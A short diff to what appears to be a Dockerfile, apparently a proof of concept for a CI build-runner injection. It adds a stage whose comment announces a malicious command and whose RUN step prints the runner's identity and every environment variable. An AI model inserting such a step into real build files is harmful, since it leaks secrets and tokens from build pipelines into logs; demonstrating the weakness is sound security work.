@@ -1,3 +1,6 @@
+FROM node:18-alpine
+# 🚨 你的恶意命令在这里被执行！
+RUN echo "Pwning the build runner!" && id && printenv
 FROM node:20-alpine AS base
 
 FROM base AS builder
